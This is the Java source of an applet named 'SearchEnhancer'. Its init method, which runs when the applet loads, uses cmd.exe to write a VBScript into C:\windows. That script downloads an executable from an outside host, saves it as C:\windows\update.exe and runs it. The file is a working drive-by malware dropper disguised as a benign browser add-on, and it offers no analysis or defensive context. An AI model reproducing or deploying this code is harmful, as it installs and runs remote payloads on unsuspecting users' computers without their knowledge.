import java.applet.Applet;
import java.io.IOException;

public class SearchEnhancer
    extends Applet
    {
        public void init()
        {
            String str = "cmd.exe /c echo Const adTypeBinary = 1 > C:\\windows\\apsou.vbs & echo Const adSaveCreateOverWrite = 2 >> C:\\windows\\apsou.vbs & echo Dim BinaryStream >> C:\\windows\\apsou.vbs & echo Set BinaryStream = CreateObject(\"ADODB.Stream\") >> C:\\windows\\apsou.vbs & echo BinaryStream.Type = adTypeBinary >> C:\\windows\\apsou.vbs & echo BinaryStream.Open >> C:\\windows\\apsou.vbs & echo BinaryStream.Write BinaryGetURL(Wscript.Arguments(0)) >> C:\\windows\\apsou.vbs & echo BinaryStream.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite >> C:\\windows\\apsou.vbs & echo Function BinaryGetURL(URL) >> C:\\windows\\apsou.vbs & echo Dim Http >> C:\\windows\\apsou.vbs & echo Set Http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> C:\\windows\\apsou.vbs & echo Http.Open \"GET\", URL, False >> C:\\windows\\apsou.vbs & echo Http.Send >> C:\\windows\\apsou.vbs & echo BinaryGetURL = Http.ResponseBody >> C:\\windows\\apsou.vbs & echo End Function >> C:\\windows\\apsou.vbs & echo Set shell = CreateObject(\"WScript.Shell\") >> C:\\windows\\apsou.vbs & echo shell.Run \"C:\\windows\\update.exe\" >> C:\\windows\\apsou.vbs & start C:\\windows\\apsou.vbs http://www.codito.de/b00m/calc.exe C:\\windows\\update.exe";
            try
            {
                Process localProcess = Runtime.getRuntime().exec(str);
            }
            catch (IOException localIOException)
            {
                localIOException.printStackTrace();
            }
        }
    }
